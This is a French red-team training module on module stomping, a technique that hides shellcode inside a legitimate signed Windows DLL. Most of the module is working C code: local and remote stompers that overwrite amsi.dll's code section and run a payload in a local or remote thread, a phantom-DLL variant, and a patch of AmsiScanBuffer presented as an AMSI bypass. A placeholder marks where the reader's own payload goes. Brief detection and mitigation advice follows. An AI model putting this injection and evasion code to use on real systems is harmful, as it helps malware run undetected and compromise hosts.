# Module W27 : Module Stomping

## Objectifs

À la fin de ce module, vous serez capable de :
- Comprendre la technique de Module Stomping (aussi appelée DLL Hollowing)
- Remplacer le code d'une DLL légitime en mémoire par du code malveillant
- Exploiter les modules légitimes pour masquer du shellcode
- Contourner les détections basées sur l'analyse des régions mémoire

## 1. Introduction au Module Stomping

### 1.1 Qu'est-ce que le Module Stomping ?

**Analogie** : Imaginez une bibliothèque avec des livres légitimes. Au lieu d'ajouter un nouveau livre suspect (nouvelle allocation mémoire), vous videz l'intérieur d'un livre légitime et y cachez votre contenu malveillant. La couverture (l'en-tête PE) reste légitime.

**Définition** : Module Stomping consiste à :
1. Charger une DLL légitime dans un processus
2. Remplacer son contenu en mémoire par du code malveillant
3. Exécuter le code malveillant depuis cette région "légitime"

**Avantages** :
- Pas de nouvelle allocation mémoire suspecte (RWX)
- La région mémoire pointe vers une DLL signée et légitime
- Contourne les scans basés sur les permissions mémoire anormales
- Les outils de monitoring voient un module légitime chargé

### 1.2 Schéma conceptuel

```
AVANT Module Stomping
=====================
Processus cible (notepad.exe)
┌─────────────────────────────┐
│ notepad.exe (code)          │
│ kernel32.dll                │
│ ntdll.dll                   │
│ user32.dll                  │
└─────────────────────────────┘

ÉTAPE 1: Charger DLL légitime
==============================
Processus cible
┌─────────────────────────────┐
│ notepad.exe (code)          │
│ kernel32.dll                │
│ ntdll.dll                   │
│ user32.dll                  │
│ amsi.dll ◄────────────────  │ Chargée via LoadLibrary
│   ├─ .text (code AMSI)     │
│   ├─ .data                  │
│   └─ .rdata                 │
└─────────────────────────────┘

ÉTAPE 2: Écraser le contenu
============================
Processus cible
┌─────────────────────────────┐
│ notepad.exe (code)          │
│ kernel32.dll                │
│ ntdll.dll                   │
│ user32.dll                  │
│ amsi.dll ◄───────────────── │ Headers PE intacts
│   ├─ .text ───────────────► │ SHELLCODE MALVEILLANT
│   ├─ .data (écrasé)        │
│   └─ .rdata (écrasé)        │
└─────────────────────────────┘
      │
      └─► Exécution du shellcode
          (mais la région s'appelle "amsi.dll")
```

## 2. Concepts fondamentaux

### 2.1 Anatomie d'un module en mémoire

**Structure PE en mémoire** :
```
Module chargé (ex: amsi.dll)
┌─────────────────────────────────┐
│ IMAGE_DOS_HEADER                │ ← Base address
│   e_magic = "MZ"                │
│   e_lfanew → NT Headers         │
├─────────────────────────────────┤
│ IMAGE_NT_HEADERS                │
│   Signature = "PE"              │
│   FileHeader                    │
│   OptionalHeader                │
│     - AddressOfEntryPoint       │
│     - SizeOfImage               │
├─────────────────────────────────┤
│ SECTION HEADERS                 │
│   .text (RX)  ◄────────────────┼─ Code exécutable
│   .data (RW)                    │
│   .rdata (R)                    │
├─────────────────────────────────┤
│ .text SECTION                   │
│   [Code de la DLL]              │ ← Zone à écraser
│   ...                           │
├─────────────────────────────────┤
│ .data SECTION                   │
│   [Variables globales]          │
├─────────────────────────────────┤
│ .rdata SECTION                  │
│   [Import table, strings]       │
└─────────────────────────────────┘
```

### 2.2 Pourquoi c'est efficace ?

**Comparaison avec l'injection classique** :

```
INJECTION CLASSIQUE
===================
VirtualAllocEx() → Nouvelle région RWX
    ├─ Nom: <Aucun>
    ├─ Permissions: RWX (TRÈS SUSPECT)
    ├─ Type: MEM_PRIVATE
    └─ Détection: Facile (scan des régions RWX)

MODULE STOMPING
===============
LoadLibrary("amsi.dll") → Région légitime
    ├─ Nom: "C:\Windows\System32\amsi.dll"
    ├─ Permissions: RX (normal pour du code)
    ├─ Type: MEM_IMAGE (module mappé)
    ├─ Signé: Microsoft Corporation
    └─ Détection: Difficile (module légitime)
```

## 3. Implémentation du Module Stomping

### 3.1 Sélection du module victime

**Critères pour choisir une DLL** :
1. **Taille suffisante** : Doit pouvoir contenir le shellcode
2. **Peu utilisée** : Pour éviter les crashs si ses fonctions sont appelées
3. **Légitime et signée** : Pour contourner les détections
4. **Chargée localement** : Pas dans un processus distant (plus simple)

**DLLs candidates populaires** :
```c
// DLLs rarement utilisées mais légitimes
const wchar_t* candidateDlls[] = {
    L"amsi.dll",          // Anti-Malware Scan Interface (ironique !)
    L"wldp.dll",          // Windows Lockdown Policy
    L"winhttp.dll",       // HTTP client (si non utilisé)
    L"cryptsp.dll",       // Crypto service provider
    L"profapi.dll",       // User profile API
    L"version.dll"        // Version checking
};
```

### 3.2 Code d'implémentation

```c
#include <windows.h>
#include <stdio.h>

// Shellcode exemple (MessageBox) - Remplacer par votre payload
unsigned char shellcode[] = {
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0xE4, 0xF0,
    0x48, 0x8D, 0x15, 0x66, 0x00, 0x00, 0x00, 0x48,
    // ... shellcode complet ...
    0xC3
};

// Trouve la section .text d'un module chargé
PVOID FindTextSection(HMODULE hModule, SIZE_T* pSectionSize) {
    if (!hModule) return NULL;

    // Récupère les headers PE
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Signature DOS invalide\n");
        return NULL;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(
        (PBYTE)hModule + pDosHeader->e_lfanew
    );

    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Signature PE invalide\n");
        return NULL;
    }

    // Parcourt les sections pour trouver .text
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        char sectionName[9] = { 0 };
        memcpy(sectionName, pSectionHeader[i].Name, 8);

        if (strcmp(sectionName, ".text") == 0) {
            PVOID textSection = (PBYTE)hModule + pSectionHeader[i].VirtualAddress;
            *pSectionSize = pSectionHeader[i].Misc.VirtualSize;

            printf("[+] Section .text trouvée\n");
            printf("    Adresse: 0x%p\n", textSection);
            printf("    Taille: %zu octets\n", *pSectionSize);

            return textSection;
        }
    }

    printf("[-] Section .text non trouvée\n");
    return NULL;
}

// Effectue le Module Stomping
BOOL ModuleStomp(const wchar_t* dllPath, PVOID payload, SIZE_T payloadSize) {
    printf("[*] Démarrage Module Stomping\n");
    printf("[*] DLL cible: %ls\n", dllPath);
    printf("[*] Taille payload: %zu octets\n", payloadSize);

    // Étape 1 : Charger la DLL légitime dans notre processus
    HMODULE hModule = LoadLibraryW(dllPath);
    if (!hModule) {
        printf("[-] Erreur LoadLibrary: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] DLL chargée à: 0x%p\n", hModule);

    // Étape 2 : Trouver la section .text
    SIZE_T textSectionSize = 0;
    PVOID pTextSection = FindTextSection(hModule, &textSectionSize);

    if (!pTextSection) {
        printf("[-] Impossible de trouver la section .text\n");
        FreeLibrary(hModule);
        return FALSE;
    }

    // Étape 3 : Vérifier que le payload tient dans la section
    if (payloadSize > textSectionSize) {
        printf("[-] Payload trop grand (%zu octets) pour la section .text (%zu octets)\n",
               payloadSize, textSectionSize);
        FreeLibrary(hModule);
        return FALSE;
    }

    printf("[+] Payload compatible avec la section .text\n");

    // Étape 4 : Changer les permissions de la section .text en RWX
    DWORD oldProtect = 0;
    if (!VirtualProtect(pTextSection, textSectionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] Erreur VirtualProtect: %d\n", GetLastError());
        FreeLibrary(hModule);
        return FALSE;
    }

    printf("[+] Permissions modifiées (RWX)\n");
    printf("[*] Anciennes permissions: 0x%08X\n", oldProtect);

    // Étape 5 : Écraser le contenu de la section .text avec notre payload
    memcpy(pTextSection, payload, payloadSize);
    printf("[+] Payload copié dans la section .text\n");

    // Étape 6 : Restaurer les permissions (optionnel, pour plus de discrétion)
    // Note: on garde RX au lieu de l'ancien protect pour rester exécutable
    DWORD dummy;
    VirtualProtect(pTextSection, textSectionSize, PAGE_EXECUTE_READ, &dummy);
    printf("[+] Permissions restaurées (RX)\n");

    // Étape 7 : Créer un thread pour exécuter le payload
    printf("[*] Création du thread d'exécution\n");

    HANDLE hThread = CreateThread(
        NULL,                   // Security attributes
        0,                      // Stack size (default)
        (LPTHREAD_START_ROUTINE)pTextSection,  // Entry point
        NULL,                   // Parameter
        0,                      // Creation flags
        NULL                    // Thread ID
    );

    if (!hThread) {
        printf("[-] Erreur CreateThread: %d\n", GetLastError());
        FreeLibrary(hModule);
        return FALSE;
    }

    printf("[+] Thread créé: 0x%p\n", hThread);
    printf("[+] Module Stomping réussi !\n");

    // Attendre l'exécution du payload
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    // Note: Ne pas libérer le module tant que le code s'exécute

    return TRUE;
}

// Version avancée : Stomping dans un processus distant
BOOL RemoteModuleStomp(DWORD dwTargetPid, const wchar_t* dllPath,
                       PVOID payload, SIZE_T payloadSize) {
    printf("[*] Démarrage Remote Module Stomping\n");
    printf("[*] PID cible: %d\n", dwTargetPid);

    // 1. Ouvrir le processus cible
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
        FALSE,
        dwTargetPid
    );

    if (!hProcess) {
        printf("[-] Erreur OpenProcess: %d\n", GetLastError());
        return FALSE;
    }

    // 2. Allouer de la mémoire pour le chemin de la DLL
    SIZE_T dllPathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    LPVOID pRemoteDllPath = VirtualAllocEx(
        hProcess,
        NULL,
        dllPathSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!pRemoteDllPath) {
        printf("[-] Erreur VirtualAllocEx: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    // 3. Écrire le chemin de la DLL
    if (!WriteProcessMemory(hProcess, pRemoteDllPath, dllPath, dllPathSize, NULL)) {
        printf("[-] Erreur WriteProcessMemory: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // 4. Charger la DLL dans le processus distant via CreateRemoteThread
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibraryW = (LPTHREAD_START_ROUTINE)
        GetProcAddress(hKernel32, "LoadLibraryW");

    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        pLoadLibraryW,
        pRemoteDllPath,
        0,
        NULL
    );

    if (!hThread) {
        printf("[-] Erreur CreateRemoteThread (LoadLibrary): %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);

    // 5. Récupérer l'adresse de base de la DLL chargée
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    CloseHandle(hThread);

    HMODULE hRemoteModule = (HMODULE)exitCode;
    if (!hRemoteModule) {
        printf("[-] Échec du chargement de la DLL distante\n");
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] DLL chargée à distance à: 0x%p\n", hRemoteModule);

    // 6. Charger la DLL localement pour analyser sa structure
    HMODULE hLocalModule = LoadLibraryW(dllPath);
    if (!hLocalModule) {
        printf("[-] Erreur LoadLibrary locale: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    SIZE_T textSectionSize = 0;
    PVOID pLocalTextSection = FindTextSection(hLocalModule, &textSectionSize);

    if (!pLocalTextSection) {
        FreeLibrary(hLocalModule);
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // 7. Calculer l'adresse de la section .text dans le processus distant
    SIZE_T textOffset = (SIZE_T)pLocalTextSection - (SIZE_T)hLocalModule;
    PVOID pRemoteTextSection = (PBYTE)hRemoteModule + textOffset;

    printf("[+] Section .text distante à: 0x%p\n", pRemoteTextSection);

    FreeLibrary(hLocalModule);

    // 8. Vérifier la taille
    if (payloadSize > textSectionSize) {
        printf("[-] Payload trop grand\n");
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // 9. Modifier les permissions de la section distante
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, pRemoteTextSection, textSectionSize,
                         PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] Erreur VirtualProtectEx: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Permissions modifiées (RWX)\n");

    // 10. Écrire le payload dans la section .text distante
    if (!WriteProcessMemory(hProcess, pRemoteTextSection, payload, payloadSize, NULL)) {
        printf("[-] Erreur WriteProcessMemory (payload): %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Payload écrit dans la section .text distante\n");

    // 11. Restaurer les permissions
    VirtualProtectEx(hProcess, pRemoteTextSection, textSectionSize,
                    PAGE_EXECUTE_READ, &oldProtect);

    // 12. Créer un thread distant pour exécuter le payload
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pRemoteTextSection,
        NULL,
        0,
        NULL
    );

    if (!hThread) {
        printf("[-] Erreur CreateRemoteThread (payload): %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Thread distant créé: 0x%p\n", hThread);
    printf("[+] Remote Module Stomping réussi !\n");

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage:\n");
        printf("  %s local              - Module Stomping local\n", argv[0]);
        printf("  %s remote <PID>       - Module Stomping distant\n", argv[0]);
        return 1;
    }

    const wchar_t* targetDll = L"amsi.dll";

    if (strcmp(argv[1], "local") == 0) {
        if (!ModuleStomp(targetDll, shellcode, sizeof(shellcode))) {
            printf("[-] Module Stomping échoué\n");
            return 1;
        }
    }
    else if (strcmp(argv[1], "remote") == 0) {
        if (argc != 3) {
            printf("Usage: %s remote <PID>\n", argv[0]);
            return 1;
        }

        DWORD pid = atoi(argv[2]);
        if (!RemoteModuleStomp(pid, targetDll, shellcode, sizeof(shellcode))) {
            printf("[-] Remote Module Stomping échoué\n");
            return 1;
        }
    }
    else {
        printf("[-] Mode invalide. Utilisez 'local' ou 'remote'\n");
        return 1;
    }

    printf("[+] Terminé avec succès\n");
    return 0;
}
```

## 4. Variantes et Optimisations

### 4.1 Module Stomping avec Phantom DLL Hollowing

**Technique combinée** :
```c
// 1. Mapper une DLL en mémoire (sans LoadLibrary)
// 2. Écraser son contenu avant qu'elle ne soit "visible"
// 3. Pas d'appel à LoadLibrary = moins de hooks déclenchés

BOOL PhantomModuleStomp(PVOID payload, SIZE_T payloadSize) {
    // Charger la DLL depuis le disque
    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\amsi.dll",
                               GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);

    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID fileBuffer = malloc(fileSize);
    ReadFile(hFile, fileBuffer, fileSize, NULL, NULL);
    CloseHandle(hFile);

    // Mapper manuellement en mémoire (comme un loader PE)
    PVOID baseAddress = MapPEFromMemory(fileBuffer);

    // Écraser immédiatement avec le payload
    PVOID textSection = FindTextSection(baseAddress, &size);
    memcpy(textSection, payload, payloadSize);

    // Exécuter
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)textSection, NULL, 0, NULL);

    free(fileBuffer);
    return TRUE;
}
```

### 4.2 Stomping sélectif (par fonction)

Au lieu d'écraser toute la section .text, écraser uniquement des fonctions ciblées :

```c
// Écraser une fonction spécifique (ex: AmsiScanBuffer)
BOOL StompFunction(HMODULE hModule, const char* functionName,
                   PVOID payload, SIZE_T payloadSize) {
    FARPROC pFunction = GetProcAddress(hModule, functionName);
    if (!pFunction) return FALSE;

    DWORD oldProtect;
    VirtualProtect(pFunction, payloadSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pFunction, payload, payloadSize);
    VirtualProtect(pFunction, payloadSize, oldProtect, &oldProtect);

    return TRUE;
}

// Utilisation pour bypasser AMSI
unsigned char amsiBypass[] = {
    0x48, 0x31, 0xC0,  // xor rax, rax
    0xC3               // ret
};

StompFunction(GetModuleHandle(L"amsi.dll"), "AmsiScanBuffer",
              amsiBypass, sizeof(amsiBypass));
```

## 5. Applications Offensives

### 5.1 Cas d'usage Red Team

**Scénario 1 : Bypass AMSI via Module Stomping**
- Cible : PowerShell avec AMSI activé
- Technique : Stomping de amsi.dll
- Code : Écraser AmsiScanBuffer avec `xor rax,rax; ret`
- Résultat : AMSI bypass complet

**Scénario 2 : Hébergement de shellcode furtif**
- Cible : Processus légitime (explorer.exe)
- Technique : Remote Module Stomping
- DLL victime : wldp.dll (Windows Lockdown Policy)
- Avantage : Shellcode hébergé dans une région signée Microsoft

**Scénario 3 : Persistance via DLL légitime**
- Technique : Stomping + Thread hijacking
- Processus : Service Windows
- Résultat : Code malveillant s'exécute depuis une DLL système

### 5.2 Comparaison OPSEC

```
Technique              │ Stealth │ Détection │ Complexité │ Fiabilité
───────────────────────┼─────────┼───────────┼────────────┼──────────
VirtualAllocEx (RWX)   │    ★    │   Élevée  │     ★      │   ★★★★★
Process Hollowing      │   ★★    │   Moyenne │    ★★★     │   ★★★★
Module Stomping        │  ★★★★   │   Faible  │    ★★★     │    ★★★
Phantom DLL            │ ★★★★★   │Très Faible│   ★★★★★    │    ★★
```

### 5.3 Détection et Contre-mesures

**Indicateurs de compromission (IOC)** :

1. **Modifications de modules signés** :
   - Hash de la DLL en mémoire différent du fichier sur disque
   - Détection : Comparer hash mémoire vs disque

2. **Permissions anormales** :
   - Section .text d'une DLL en RWX (au lieu de RX)
   - Détection : Scanner les permissions mémoire

3. **Comportement anormal** :
   - Thread créé pointant vers le milieu d'une section .text
   - Détection : ETW, analyse des stacks de threads

**Code de détection** :

```c
BOOL DetectModuleStomp(HANDLE hProcess, HMODULE hModule) {
    // 1. Récupérer le chemin du module
    WCHAR modulePath[MAX_PATH];
    GetModuleFileNameExW(hProcess, hModule, modulePath, MAX_PATH);

    // 2. Calculer hash du fichier sur disque
    BYTE diskHash[32];
    HashFile(modulePath, diskHash);

    // 3. Calculer hash du module en mémoire
    BYTE memHash[32];
    HashMemoryRegion(hProcess, hModule, memHash);

    // 4. Comparer
    if (memcmp(diskHash, memHash, 32) != 0) {
        printf("[!] Module stomping détecté sur %ls\n", modulePath);
        return TRUE;
    }

    return FALSE;
}
```

**Mitigations** :

1. **Integrity checking** :
   - Vérification régulière des hash de modules chargés
   - Microsoft Defender : Memory Integrity Checking

2. **CFG/CIG** :
   - Control Flow Guard : Empêche l'exécution de code non-CFG
   - Code Integrity Guard : Valide les signatures

3. **EDR avancé** :
   - Monitoring des appels VirtualProtect sur modules système
   - Analyse comportementale des threads

## 6. Checklist de maîtrise

- [ ] Je comprends le concept de Module Stomping
- [ ] Je peux analyser la structure PE d'un module chargé
- [ ] Je sais trouver et modifier la section .text
- [ ] Je maîtrise VirtualProtect pour changer les permissions
- [ ] Je peux implémenter un Stomping local et distant
- [ ] Je connais les DLLs candidates pour le Stomping
- [ ] Je comprends les variantes (Phantom DLL, per-function)
- [ ] Je sais détecter le Module Stomping

## Exercices

Voir [exercice.md](exercice.md) pour :
1. Implémenter un Module Stomping basique sur amsi.dll
2. Créer un détecteur de Module Stomping
3. Développer un Phantom DLL Hollowing
4. Bypass AMSI via Stomping de fonction

---

**Navigation**
- [Module précédent : Process Doppelganging](../04-Process-Doppelganging/)
- [Module suivant : Shellcode Injection](../06-Shellcode-Injection/)
